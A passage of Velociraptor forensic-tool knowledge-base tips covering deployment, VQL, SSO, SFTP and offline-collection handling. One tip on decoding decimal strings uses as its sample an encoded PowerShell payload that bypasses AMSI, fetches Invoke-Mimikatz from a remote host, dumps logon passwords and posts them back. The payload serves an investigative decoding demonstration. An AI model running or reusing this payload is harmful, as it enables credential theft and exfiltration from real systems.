   0x0010:   Name: GLIBC_2.2.5  Flags: none  Version: 10
   0x0020: Version: 1  File: libpthread.so.0  Cnt: 2
   0x0030:   Name: GLIBC_2.3.2  Flags: none  Version: 6
   0x0040:   Name: GLIBC_2.2.5  Flags: none  Version: 5
   0x0050: Version: 1  File: libc.so.6  Cnt: 8
   0x0060:   Name: GLIBC_2.11  Flags: none  Version: 12
   0x0070:   Name: GLIBC_2.7  Flags: none  Version: 11
   0x0080:   Name: GLIBC_2.14  Flags: none  Version: 9
   0x0090:   Name: GLIBC_2.15  Flags: none  Version: 8
   0x00a0:   Name: GLIBC_2.4  Flags: none  Version: 7
   0x00b0:   Name: GLIBC_2.3.4  Flags: none  Version: 4
   0x00c0:   Name: GLIBC_2.2.5  Flags: none  Version: 3
   0x00d0:   Name: GLIBC_2.3  Flags: none  Version: 2
```

In the above example this binary requires at least `GLIBC_2.15` to
run. You can tell what version of libc you have on any particular
system using the local package manager.

```
$ dpkg -l libc6:amd64
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version       Architecture Description
+++-==============-=============-============-=================================
ii  libc6:amd64    2.33-0ubuntu5 amd64        GNU C Library: Shared libraries
```

In this case this system has GLIBC version 2.33 which is higher than
the minimum required version of 2.15.

However for older systems, the locally installed GLIBC may be older
than required. This results in an error when we attempt to run it. For
example on an old CentOS 6 system:

```
$ ./velociraptor-v0.6.4-linux-amd64
./velociraptor-v0.6.4-linux-amd64: /lib64/libc.so.6: version `GLIBC_2.14' not found (required by ./velociraptor-v0.6.4-linux-amd64)
./velociraptor-v0.6.4-linux-amd64: /lib64/libc.so.6: version `GLIBC_2.15' not found (required by ./velociraptor-v0.6.4-linux-amd64)
```

Since the version requirement is added at build time, we really need
to build on an old system to ensure the linked to GLIBC is old enough.

Velociraptor uses the [musl](https://www.musl-libc.org/) project to
build completely static binaries independent of the GLIBC installed on
the system. While this feature is considered experimental it seems to
work well and produces truly portable binaries.

We recommend that version to only be used for clients on older
systems, although it might also work for a server too (but really you
should be running servers on modern patched systems).

Tags: #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/hunt_by_label.md
======
# How to control hunting by label groups?

In Velociraptor, `Hunts` are sets of the same collections across
clients. For example, a hunt for `Scheduled Tasks` will automatically
collect the scheduled tasks from each client.

When creating the hunt it is possible to target the hunt to a
`Label`. This only schedules the hunt on clients that have that same
label. This is useful when collecting a lot of data which does not
make sense to collect from every machine in the fleet. For example in
the following screenshot I am limiting the heavy triaging collection
to machines with the label `Triage`.

![Limiting a hunt to a label](limiting_hunts.png)

## Assigning clients to the hunt.

Normally when we limit a hunt for a label we immediately schedule the
hunt on all machines with that label.

However it also works the other way around - When a label is added on
a client, if the hunt targets this label, the client will be
automatically added to the hunt!

This means it is possible to create heavy hunts targeting specific
labels, and then as the investigation progresses, simply assign the
label to the client to automatically cause the hunt to collect on that
client.

![Apply a label to a client to trigger hunt participation](apply_label.png)

Tags: #hunting #vql #labels

---END OF FILE---

======
FILE: /content/knowledge_base/tips/collect_artifact_unknown.md
======
# Error "Parameter refers to an unknown artifact" when collecting a CLIENT artifact

Before an artifact is collected from the client, the artifact is
compiled into a VQL request by the artifact compiler. This actually
transforms the vql and injects dependent artifacts into the request so
the client can evaluate it. The client's VQL engine will **never** use
built in artifacts and must always have artifacts injected in the request.

The reason for that is that if an artifact is updated on the server
(e.g. by upgrading the server or edit the custom artifact) the client
must be given the latest version of the artifact.

When the VQL compiler sees a statement like:

```vql
SELECT * FROM Artifact.Dependant.Artifact()
```

It will recognize the the the VQL is dependent on the artifact
`Dependent.Artifact` and will inject it into the VQL request. You can
see this in the `Request` tab - the `artifacts` section of the request
will include dependent artifact definitions (in this case the artifact
calls `Generic.Utils.FetchBinary`).

```json
[
  {
     "session_id": "F.CR3B2IIN3E8GK",
     "request_id": "1",
     "FlowRequest": {
         "VQLClientActions": [
         {
           "query_id": "1",
           "total_queries": "1",
           ....
           "artifacts": [
           {
               "name": "Generic.Utils.FetchBinary",
               "parameters": [
```

This issue comes up commonly in two scenarios:

### Using the VQL shell to collect a custom artifact

In this case the GUI will collect the artifact `Generic.Client.VQL`
which essentially evaluates the query provided as a string on the
client.

Because the query is given as an opaque string parameter, the artifact
compiler does not see any dependencies and can not inject them into
the request. Built in artifacts are allowed in this case but custom
artifacts are not supported.

If you need to collect a custom artifact from the endpoint, just
collect it as normal - do not use the VQL shell for that.

### Using the `collect()` plugin on the client to prepare a collection zip file.

Another similar issue occurs when writing a custom artifact that uses
the `collect()` plugin. Similarly because the artifacts to collect are
given as strings, the compiler has no idea these are a dependency.

For example this VQL code

```vql
SELECT * from collect(artifacts=['Generic.Collectors.File'],
   args=dict(`Generic.Collectors.File`=dict(`collectionSpec`=collectionSpec,
             `Root`=Root)),
   password='infected',
   output=tempzip)
```

To fix this artifact the `Generic.Collectors.File` artifact must be
given as a dependency. Either include it in the artifact's `import`
section or add the following VQL statement:

```vql
LET _ = SELECT * FROM Artifact.Generic.Collectors.File()
```

That statement will not actually run the artifact (it is a lazy LET
statement) but the compiler's static analyzer will identify the
artifact as a dependency and be able to inject it into the request.

Tags: #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/identifier_with_space.md
======
# In VQL, can I SELECT a column with special characters in its name?

Sometimes a VQL query will emit a column name with special characters in its name, such as a dot, space or other special characters.

You can still refer to this column using backticks around the identifier name:

```vql
-- This will not work because VQL will interpret the dot as an operator
SELECT Raddr.IP FROM ...

-- This will work because VQL will treat the entire thing as a single identifier
SELECT `Raddr.IP` FROM ...
```

You can read more about [VQL identifiers]({{< ref "/docs/vql/#identifiers-with-spaces" >}})

Tags: #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/decimaldecode.md
======
# How can I convert decimal?

During investigation you may find logs or other data with decimal-encoded strings - we can leverage the format() function to convert to data.  

```vql
LET decimal = ( 91,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,114,118,101,114,67,101,114,116,105,102,105,99,97,116,101,86,97,108,105,100,97,116,105,111,110,67,97,108,108,98,97,99,107,32,61,32,123,36,116,114,117,101,125,10,116,114,121,123,10,91,82,101,102,93,46,65,115,115,101,109,98,108,121,46,71,101,116,84,121,112,101,40,39,83,121,115,39,43,39,116,101,109,46,77,97,110,39,43,39,97,103,101,109,101,110,116,46,65,117,116,39,43,39,111,109,97,116,105,111,110,46,65,109,39,43,39,115,105,85,116,39,43,39,105,108,115,39,41,46,71,101,116,70,105,101,108,100,40,39,97,109,39,43,39,115,105,73,110,105,39,43,39,116,70,97,105,108,101,100,39,44,32,39,78,111,110,80,39,43,39,117,98,108,105,99,44,83,116,97,39,43,39,116,105,99,39,41,46,83,101,116,86,97,108,117,101,40,36,110,117,108,108,44,32,36,116,114,117,101,41,10,125,99,97,116,99,104,123,125,10,91,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,114,118,101,114,67,101,114,116,105,102,105,99,97,116,101,86,97,108,105,100,97,116,105,111,110,67,97,108,108,98,97,99,107,32,61,32,123,36,116,114,117,101,125,10,91,83,121,115,116,101,109,46,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,99,117,114,105,116,121,80,114,111,116,111,99,111,108,32,61,32,91,83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,121,80,114,111,116,111,99,111,108,84,121,112,101,93,39,83,115,108,51,44,84,108,115,44,84,108,115,49,49,44,84,108,115,49,50,39,10,73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,115,58,47,47,49,48,46,48,46,49,46,55,58,52,52,51,47,73,110,118,111,107,101,45,77,105,109,105,107,97,116,122,46,112,115,49,39,41,10,36,99,109,100,32,61,32,73,110,118,111,107,101,45,77,105,109,105,107,97,116,122,32,45,67,111,109,109,97,110,100,32,39,112,114,105,118,105,108,101,103,101,58,58,100,101,98,117,103,32,115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115,32,101,120,105,116,39,10,36,114,101,113,117,101,115,116,32,61,32,91,83,121,115,116,101,109,46,78,101,116,46,87,101,98,82,101,113,117,101,115,116,93,58,58,67,114,101,97,116,101,40,39,104,116,116,112,115,58,47,47,49,48,46,48,46,49,46,55,58,52,52,51,47,39,41,10,36,114,101,113,117,101,115,116,46,77,101,116,104,111,100,32,61,32,39,80,79,83,84,39,10,36,114,101,113,117,101,115,116,46,67,111,110,116,101,110,116,84,121,112,101,32,61,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,10,36,98,121,116,101,115,32,61,32,91,83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103,93,58,58,65,83,67,73,73,46,71,101,116,66,121,116,101,115,40,36,99,109,100,41,10,36,114,101,113,117,101,115,116,46,67,111,110,116,101,110,116,76,101,110,103,116,104,32,61,32,36,98,121,116,101,115,46,76,101,110,103,116,104,10,36,114,101,113,117,101,115,116,83,116,114,101,97,109,32,61,32,36,114,101,113,117,101,115,116,46,71,101,116,82,101,113,117,101,115,116,83,116,114,101,97,109,40,41,10,36,114,101,113,117,101,115,116,83,116,114,101,97,109,46,87,114,105,116,101,40,36,98,121,116,101,115,44,32,48,44,32,36,98,121,116,101,115,46,76,101,110,103,116,104,41,10,36,114,101,113,117,101,115,116,83,116,114,101,97,109,46,67,108,111,115,101,40,41,10,36,114,101,113,117,101,115,116,46,71,101,116,82,101,115,112,111,110,115,101,40,41 )

LET convert_decimal(data) = SELECT format(format='%c',args=_value) as Value FROM foreach(row=data)

SELECT join(array=convert_decimal(data=decimal).Value,sep='') as Data FROM scope()

```
![image](https://user-images.githubusercontent.com/13081800/199373835-a27910e7-40ea-4dcc-a818-baff4e19b40c.png)

Tags: #decode #decimal #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/ssl.md
======
# How do I use my own SSL certificates?

Use case: For an on-premises deployment, Let's Encrypt may not be an option. You may want to use your own enterprise/corporate Certificate Authority (CA) or another 3rd party.

Thanks to recent enhancements by the Velociraptor developers, this is quite a simple task. The below is a simple test configuration used and may need adapting to your environment.

Prior to commencing we have a plaintext PEM private key, certificate for our Velociraptor server, and the certificate chain of our enterprise CA, including the root and multiple intermediaries.


### Generate the configuration
Using Ubuntu we generated a stock standard "Self-signed SSL" configuration:

`./velociraptor-v0.6.3-2-linux-amd64 config generate -i`

<img width="491" alt="image" src="https://user-images.githubusercontent.com/30587915/163787136-f9e6f16f-5119-4cd0-ba43-741ab64cdc42.png">

### Update the server.config.yaml
Locate the frontend section and add the `tls_certificate_filename` and `tls_private_key_filename` parameters. Enter the absolute path to these files. For testing, we placed in /etc however there are better places for production use.
```yaml
Frontend:
  tls_certificate_filename: /etc/velociraptor.pem
  tls_private_key_filename: /etc/velociraptor.key
```

<img width="221" alt="image" src="https://user-images.githubusercontent.com/30587915/163787153-9734cbb8-ddbf-4140-b4d6-1c89e19afa7c.png">


### Update the client.config.yaml
In the client section modify `use_self_signed_ssl` to be false, and add the CA root/intermediary certificates to be trusted by the client:

```yaml
use_self_signed_ssl: false

Crypto:
    root_certs: |
          -----BEGIN CERTIFICATE-----
          XXXXX
          -----END CERTIFICATE-----
          -----BEGIN CERTIFICATE-----
          XXXXX
          -----END CERTIFICATE-----
          -----BEGIN CERTIFICATE-----
          XXXXX
          -----END CERTIFICATE-----
          ...
```

### Test
Launching the server we should be able to connect to the GUI using our new certificate. Note this must be trusted by browser/system to prevent errors.

Launching the client, it should connect securely without error, using the trusted CA chain and the new server certificate.

No changes need to be made to the pinned certificate name, nor do any certificates need to be modified in the configuration files.

Tags: #configuration #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/setting_up_sftp.md
======
# How to setup an SFTP server

There are many options for receiving uploaded files from the offline
collector, for example using S3 buckets, Azure storage services and
even the [AWS SFTP transfer service]({{% ref "blog/2021/2021-12-11-sftp-in-aws/" %}}).

However sometimes it is simpler to set up your own SFTP server to
receive incoming uploads (it is certainly cheaper than the AWS managed
service).

This tip explains how to set up a server securely.

1. Create a new Linux based VM and open port 22 for incoming
   requests. This can be in the cloud or on prem.
2. Create an `sftpupload` user

```
sudo adduser sftpupload
```

3. Create a directory for files to be uploaded and set the directory
   to be writable by the user.

```
mkdir -p /var/sftp/files
chown root:root /var/sftp/files

# Allow anyone to write there
chmod o+wx /var/sftp/files

# No directory listing possible
chmod o-r /var/sftp/files
```

4. Add the following in the file `/etc/ssh/sshd_config`

```
PasswordAuthentication no

Match User sftpupload
    ForceCommand internal-sftp
    PasswordAuthentication no
    ChrootDirectory /var/sftp
    PermitTunnel no
    AllowAgentForwarding no
    AllowTcpForwarding no
    X11Forwarding no
```

5. Create keys for the `sftpupload` user

```
sudo -u sftpuser bash
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/sftpuser/.ssh/id_rsa)

# Make sure the permissions are correct for the directory
chmod 600 /home/sftpuser/.ssh/
```

In the offline collector configuration you should use this private key
(`/home/sftpuser/.ssh/id_rsa`) of the form:

```
-----BEGIN OPENSSH PRIVATE KEY-----
.....
-----END OPENSSH PRIVATE KEY-----
```


6. Verify you can connect to the server, list files and upload files

```
$ sftp localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:nJ9IXQjeXVXURD0bVCcylr4+5/Da0jnJEdrLqgZYBko.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Connected to localhost.
sftp> ls -l files
remote readdir("/files/"): Permission denied
sftp> put /etc/passwd /files/passwd.txt
Uploading /etc/passwd to /files/passwd.txt
```

As you can see the `sftpupload` user does not have permission to read
the directory but can upload files to it.


Tags: #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/fuse_mount.md
======
# How do I use the files inside the offline collector ZIP?

The Velociraptor offline collector is a convenient way to collect bulk
triage data quickly and efficiently, without having to install any new
software. The offline collector produces a zip file where metadata
about the collection and bulk files are stored.

However, because the container format is a ZIP file there are some
caveats about the way files are stored within it:

1. To enhance compatibility certain characters are escaped from a
   filename. For example, Velociraptor supports any form of paths but
   windows paths such as `\\.\C:` representing a device are not
   supported in a zip file (because they can not be extracted properly
   on windows).

   Therefore Velociraptor will escape these paths inside the ZIP file.

2. Some other programs try to preserve the timestamps of the acquired
   files inside the ZIP file. This is problematic because the ZIP
   format only supports storing one timestamp at a resolution of 1
   second.

{{% notice warning "Timestamps in triage collections" %}}

Some external tools attempt to use the acquired file timestamp in the
analysis and parsing of the file itself (e.g. prefetch parsing). This
is a mistake because it assumes the files being parsed are on the
originating system and they have not been collected or moved first. By
copying or manipulating files in any way those timestamps will change
increasing the chances of incorrect analysis.

Some triage tools go out of their way to preserve these timestamps at
the filesystem level - for example by creating a container NTFS image
instead of a ZIP file. While this helps to preserve some timestamps by
essentially timestomping the collected files into the correct
timestamp it is a workaround at best.

Velociraptor instead relies on timestamps being stored in the metadata
file and not within the ZIP file itself.

{{% /notice %}}

## Structure of the collected files

Lets examine the structure of the offline collection:

```
$ unzip -l Collection-WIN-SJE0CKQO83P_lan-2024-11-05T17_45_36Z.zip
Archive:  Collection-WIN-SJE0CKQO83P_lan-2024-11-05T17_45_36Z.zip
Length      Date    Time    Name
---------  ---------- -----   ----
       32  2024-10-15 16:16   uploads/ntfs/%5C%5C.%5CC%3A/$Extend/$UsnJrnl%3A$Max
     8192  2024-10-15 17:12   uploads/ntfs/%5C%5C.%5CC%3A/$Boot
  1048576  2024-10-15 17:12   uploads/ntfs/%5C%5C.%5CC%3A/$Extend/$RmMetadata/$TxfLog/$Tops%3A$T
     1152  2021-05-08 18:15   uploads/auto/C%3A/ProgramData/Microsoft/Windows/Start Menu/Programs/Server Manager.lnk
     1190  2024-10-15 00:06   uploads/auto/C%3A/ProgramData/Microsoft/Windows/Start Menu/Programs/Azure Arc Setup.lnk
     2349  2021-05-08 18:15   uploads/auto/C%3A/ProgramData/Microsoft/Windows/Start Menu/Programs/Immersive Control Panel.lnk
...
     3256  1980-00-00 00:00   results/Windows.KapeFiles.Targets%2FAll File Metadata.json.index
   137590  1980-00-00 00:00   results/Windows.KapeFiles.Targets%2FAll File Metadata.json
     3256  1980-00-00 00:00   results/Windows.KapeFiles.Targets%2FUploads.json.index
   222960  1980-00-00 00:00   results/Windows.KapeFiles.Targets%2FUploads.json
     6192  1980-00-00 00:00   log.json.index
   175374  1980-00-00 00:00   log.json
      910  2024-11-06 03:46   collection_context.json
   280433  2024-11-06 03:46   requests.json
      813  2024-11-06 03:46   client_info.json
     3448  1980-00-00 00:00   uploads.json.index
   154136  1980-00-00 00:00   uploads.json
---------                     -------
776656838                     442 files
```

We see the following:

1. The files collected using the `ntfs` accessor are stored in the
   prefix `uploads/ntfs/`.
2. Since those NTFS paths contain device names (with backslashes) that
   can not appear in a Windows filename, Velociraptor will escape the
   backslashes (So `\\.C:` becomes `%5C%5C.%5CC%3A`). If you also
   collect files from `VSS` they will be shown with the VSS device
   name escaped.
3. Files acquired using the `auto` accessor are stored with a prefix
   is `uploads/auto/`. Those filenames usually start with the drive
   name e.g. `C:` which has a `:` character. This is not usually
   allowed in a windows filename, so the character is escaped into
   `C%3A`
4. You can see that some of the files do retain the ZIP timestamp -
   this is done on a best effort basis as ZIP can only represent one
   timestamp with a second resolution.
5. The actual file metadata is stored in the `results` folder.


Let's examine the metadata:

```json
$ unzip -p Collection-WIN-SJE0CKQO83P_lan-2024-11-05T17_45_36Z.zip 'results/Windows.KapeFiles.Targets%2FUploads.json' | head -50 | tail -2

{"CopiedOnTimestamp":1730828739,"SourceFile":"C:\\Users\\Default\\NTUSER.DAT","DestinationFile":"C:\\Users\\Default\\NTUSER.DAT","FileSize":262144,"SourceFileSha256":"e05793b7ad9bb379514dcb59e778daeb76660cd19a009ee1d8d0dbcd4ed25de0","Created":"2021-05-08T08:06:51.7462883Z","Changed":"2024-10-14T15:32:30.3560316Z","Modified":"2024-10-14T15:32:30.3560316Z","LastAccessed":"2024-10-14T15:32:30.3560316Z","_Source":"Generic.Collectors.File/Uploads"}

{"CopiedOnTimestamp":1730828739,"SourceFile":"C:\\Windows\\System32\\winevt\\Logs\\HardwareEvents.evtx","DestinationFile":"C:\\Windows\\System32\\winevt\\Logs\\HardwareEvents.evtx","FileSize":69632,"SourceFileSha256":"f5f9e97a6b1ec8d46a9bd5b9d4ccae96521b85517b0337b248814d2e974a968b","Created":"2024-10-15T06:16:46.6761566Z","Changed":"2024-10-15T06:17:06.4886135Z","Modified":"2024-10-15T06:17:06.4886135Z","LastAccessed":"2024-10-15T06:17:06.4886135Z","_Source":"Generic.Collectors.File/Uploads"}
```

The metadata contains the precise filename seen, all the timestamps
and the correct hashes of the files collected.

## Preserving file names and timestamps

While you can extract the files using a regular ZIP program, the
program will likely not take into account the various transformations
made by the offline collector. If you need to have those preserved you
can use the
[Windows.KapeFiles.Extract](https://docs.velociraptor.app/artifact_references/pages/windows.kapefiles.extract/)
artifact to extract the files to a local directory.

```bash
velociraptor-v0.73.2-linux-amd64 -v artifacts collect Windows.KapeFiles.Extract --args ContainerPath=Collection-WIN-SJE0CKQO83P_lan-2024-11-05T17_45_36Z.zip --args OutputDirectory=/tmp/MyOutput/
```

This will extract the files from the container to the directory
`/tmp/MyOutput/` preserving their timestamps.


## Using FUSE to mount the collection

On Linux, a mechanism called `fuse` (Filesystem in Userspace) exists
to allow an application to mount a `filesystem` as a directory on the
global filesystem. While extracting the collection using the above
method works, it still results in rewriting the same files again on
the system, therefore using more disk space and time.

Instead we can use Velociraptor to mount the offline collection onto a
local directory - transparently decompressing data and applying the
file metadata as various timestamps.

```
./velociraptor-v0.73.2-linux-amd64 -v fuse container /tmp/mnt/ Collection-WIN-SJE0CKQO83P_lan-2024-11-05T17_45_36Z.zip --emulate_timestamps --unix_path_escaping --map_device_names_to_letters --strip_colons_on_drive_letters
```

The above command will mount the container on the directory
`/tmp/mnt`. The following options are supported:

* `--emulate_timestamps` will recreate all timestamps from the metadata file.
* `--unix_path_escaping` will allow some characters which are not allowed on windows by are allowed on Unix (e.g. `:`)
* `--map_device_names_to_letters` will replace NTFS style devices like `\\.\C:` with drive letters `C:`
* `--strip_colons_on_drive_letters` will remove `:` characters completely so `C:` will become a directory called `C`

Tags: #forensics

---END OF FILE---

======
FILE: /content/knowledge_base/tips/multiple_oauth.md
======
# How can I configure Velociraptor for multiple SSO providers

Velociraptor can be configured to use a single SSO provider using the usual configuration building wizard (see [Here](https://docs.velociraptor.app/docs/deployment/server/#configuring-google-oauth-sso)), but the wizard does not offer to configure multiple providers.

Sometimes we want to have multiple providers so we can allow users from another organization to be able to log into Velociraptor. To do this we need to configure the SSO authenticator manually in the configuration file.

Simply run `velociraptor config generate -i` and select the OAuth provider for the first provider. In the end your config file will have the following section where `oauth_client_id` and `oauth_client_secret` refer to the Google OAuth app you created:

```yaml
GUI:
  ... more settings ...
  authenticator:
    type: Google
    oauth_client_id: 12345.apps.googleusercontent.com
    oauth_client_secret: XYZ1234
```

To provide multiple authenticators, you will need to manually change to the `multi` authenticator type:
```yaml
GUI:
  ... more settings ...
  authenticator:
    type: multi
    sub_authenticators:
     - type: Google
       oauth_client_id: 12345.apps.googleusercontent.com
       oauth_client_secret: XYZ1234
     - type: Github
       oauth_client_id: 123456
       oauth_client_secret: 76521376523
     - type: oidc
       oidc_issuer: https://accounts.google.com
       oidc_name: Rapid7
       avatar: https://example.com/avatar.png
       oauth_client_id: XXXXX
       oauth_client_secret: AAAAA
```

Note that you can have multiple `OIDC` authenticators and each can have a separate name and an icon associated with it (e.g. if multiple organizations use separate Okta logins).

![Logging in with multiple providers](https://user-images.githubusercontent.com/3856546/160241517-c2bf85e5-7d5d-4d3b-ac24-b2bfbda5436b.png)

## Granting a user a role.

Velociraptor will trust any of the configured authenticators, to identify the user and based on the username, grant the user the appropriate roles on the Velociraptor server. You will need to grant the user a role either through the command line:

```
velociraptor user add --role administrator mike@gmail.comm
```

Or via a notebook cell:
```sql
SELECT user_create(user="mike@gmail.com", role="administrator")
FROM scope()
```

{{% notice warning "Trusting multiple providers" %}}

Be aware that trusting multiple identity providers can result in account hijack if a user can get an account of the same name on another provider. Velociraptor just uses the account name provided by the OAuth provider to grant access and does not keep track of which provider actually identified the user.

In simple terms, if a user has username "mike" on `OIDC` provider 1 and another user can get say a Github account for the user "mike", then the second user can impersonate the first user by logging in with the second provider.

{{% /notice %}}

Tags: #configuration #sso #deployment

---END OF FILE---

======
FILE: /content/knowledge_base/tips/multi_org.md
======
# How do I get a list of hunts across multiple organizations?

Are you looking for a way to generate user metrics across the entire server (like Hunts run per user)?

Orgs are separated out so when you run a query you are running that query within the context of the org. Normally the hunts scheduled in an organization can be accessed using the [hunts()](https://docs.velociraptor.app/vql_reference/server/hunts/) plugin, but that normally acts within a single Org.

To run a query in another org, you can switch org contexts using the [query()](https://docs.velociraptor.app/vql_reference/misc/query/) plugin.

So for example to see all hunts in all orgs:

```sql
SELECT * FROM foreach(
  row={
    SELECT OrgId FROM orgs()
  },
  query={
    SELECT * FROM query(query={
      SELECT * FROM hunts()
    }, org_id=OrgId)
  })
```

This query iterates over all the orgs, then runs the `SELECT * FROM hunts()` query within the org context. 

You can simplify the query using LET stored queries:
```sql
LET MyQuery = SELECT * FROM hunts()
LET AllOrgs = SELECT OrgId FROM orgs()

SELECT * FROM foreach(row=AllOrgs,
  query={
    SELECT * FROM query(query=MyQuery, org_id=OrgId)
  })
```

Of course your user account must have access to the orgs. Each org has a separate ACL for each user, so your user needs to have at least the `READ_RESULTS` permission to be able to see the org.

Some plugins (e.g. [hunt()](https://docs.velociraptor.app/vql_reference/server/hunt/) ) support orgs directly for convenience but generally you should use the above approach. This will also remind you that each such query is running in a separate org context and therefore can not see other data at the same time.


---END OF FILE---

======
FILE: /content/knowledge_base/tips/merging_config.md
======
# How can I override the configuration file?

Velociraptor relies on the configuration file to control the operation
of the server or client. Usually the configuration file is generated
interactively using the `velociraptor config generate -i` command.

Many people want to automate the configuration generation or override
the configuration in some way. This short tip covers some of the
common ways to do that.

## Automating configuration generation.

When generating a new configuration, Velociraptor will generate new
key material and create a reasonable skeleton for the supported
deployment scenario. In the following command, Velociraptor will emit
a basic configuration file template to standard output, which can be
easily redirected to a file:

```
$ velociraptor-v0.6.4-linux-amd64 config generate > /tmp/config.yaml
```

To customize the generated configuration we can apply a JSON
merge/patch step. [JSON
merge](https://datatracker.ietf.org/doc/html/rfc7396) and [JSON
patch](http://jsonpatch.com/) are standard ways of specifying a
transformation on a JSON object.

{{% notice tip Viewing the Configuration in JSON %}}

Normally the configuration file is in YAML but you can also view it in
JSON using the `--json` flag to the `config show` command:

```
velociraptor --config config.yaml config show --json
```

Since YAML is a superset of JSON you can also provide this JSON blob
to Velociraptor as the actual configuration (no need to convert it
back to YAML). This helps to prepare the JSON merge patch - simply
remove the fields you dont want to change and change the fields you do
want to change.

{{% /notice %}}

For example, imagine we want to specify a new URL for clients to
connect to. We can merge the following JSON blob with the config:

```
$ velociraptor --config /tmp/config.yaml config show --merge '{"Client":{"server_urls":["https://192.168.1.11:8000/", "https://192.168.1.12:8000/"]}}' > /tmp/new_config.yaml
```

It may be more convenient to store the JSON merge blob in a file
instead of specifying on the command line - use the `--merge_file`
option to provide it.

## Overriding configuration at runtime

While the `config show` command can be used to manipulate the
configuration file, sometimes we want to change a few values at
runtime on a temporary basis.

The first option is using the `--config_override` flag to specify the
path to a JSON merge file that overrides the configuration at
runtime. Velociraptor will load the configuration file specified by
the `--config` flag as normal, but then will apply the JSON merge blob
to override specific fields.

This is useful for specifying a larger configuration manipulation - it
will not change the main config file at all, but will change the
running configuration

## Overriding configuration via command line flags

Velociraptor allows most configuration settings to be overriden by
suitable command line flags. Since there are so many flags, the usual
help shown with the `--help` flag does not include these configuration
overriding flags.

You can see all the defined flags by enabling the DEBUG environment
variable:

```
$ DEBUG=1 ./velociraptor --help

...
  --config.client-writeback-darwin=CONFIG.CLIENT-WRITEBACK-DARWIN
  --config.client-writeback-linux=CONFIG.CLIENT-WRITEBACK-LINUX
  --config.client-writeback-windows=CONFIG.CLIENT-WRITEBACK-WINDOWS
  --config.client-tempdir-linux=CONFIG.CLIENT-TEMPDIR-LINUX
  --config.client-tempdir-windows=CONFIG.CLIENT-TEMPDIR-WINDOWS
```

This is useful to override specific settings temporarily - for example
when running the server in a cloud environment, the bind port is
determined by the platform. In this case it is easier to simply
override this on the command line rather than manipulate the config
file.

```
velociraptor --config /etc/velociraptor/server.config.yaml frontend --config.frontend-bind-port=$PORT
```


Tags: #configuration

---END OF FILE---

======
FILE: /content/knowledge_base/tips/automating_metadata.md
======
# How can I automatically add & update client metadata?

[Client metadata]({{< ref "/docs/clients/metadata/" >}}) is used to store custom
information associated with each client. Velociraptor always stores basic
information about all clients but you may want to store additional information,
for example asset information. Client metadata makes this possible by allowing
you to store any kind of data and associate it with a client. Client metadata
can also be used to search for and filter clients in the GUI and in VQL queries,
as we will demonstrate below.

Metadata can be manually added and updated for any client in the client's
Overview page, but also via VQL using the
[client_set_metadata]({{< ref "/vql_reference/server/client_set_metadata/" >}})
function.

We can automate the addition and updating of client metadata by running a
[Server Event Artifact]({{< ref "/docs/server_automation/server_monitoring/" >}})
which sets metadata based on results of queries run on the client.

{{% notice note "Metadata or Labels?" %}}

Metadata is a set of fields associated with each client. Labels can also be
regarded as information associated with a client, but in Velociraptor labels are
a more transient kind of information and are designed to be added and removed
relatively frequently. Labels provide a way to group clients whereas Metadata
provides a way to store information *about* each client.

It's important that you choose the appropriate one for your use case. This
article is about automating Metadata but if you want to do similar automation of
Labels then you may find this article more useful:
[How can I automatically apply labels to clients?]({{< ref "/knowledge_base/tips/automating_labels/" >}})

{{% /notice %}}

## Adding/updating metadata during client interrogation

When a client connects for the first time in a Velociraptor deployment, the
server instructs the client to enroll and also tells it to run the
`Generic.Client.Info` artifact. This built-in artifact is designed to collect
basic information about the endpoint. We refer to this process as
["interrogation"]({{< ref "/docs/clients/interrogation/" >}}).

As explained
[here](https://docs.velociraptor.app/docs/clients/interrogation/#custom-artifact-override),
the default interrogation artifact can be overridden with a custom version. If
such a custom artifact is present on the Velociraptor server then all clients
will use it.

In this example we will use a custom interrogation artifact to collect custom
information and then use a
[Server Event]({{< ref "/docs/server_automation/server_monitoring/" >}}) artifact
to watch for any new collections of `Custom.Generic.Client.Info` and add or update
metadata fields based on the results.

The interrogation flow can also be run manually by clicking the **Interrogate**
button on the client Overview page, or by creating a hunt for the
`Generic.Client.Info` artifact. Such a hunt can further be created on a
scheduled basis as demonstrated by the
[Server.Monitoring.ScheduleHunt]({{< ref "/artifact_references/pages/server.monitoring.schedulehunt/" >}})
artifact.

Before we set up the event monitoring we first need to:

- prepare our custom interrogation artifact (including subordinate artifacts),
  and
- configure metadata indexing on the server.

### Add custom interrogation artifacts

We are going to have our custom interrogation artifact
(`Custom.Generic.Client.Info`) call 2 other artifacts which will each collect the
particular results we are interested in having as metadata.

#### Add an artifact to collect some BIOS info

The first artifact will query the endpoint for some BIOS information which may
be useful for asset management. On Windows it will use WMI and on Linux it will
use the `dmidecode` program which is available by default on most modern Linux
systems. These methods both return equivalent data.

```yaml
name: Generic.Client.BiosInfo
description: |
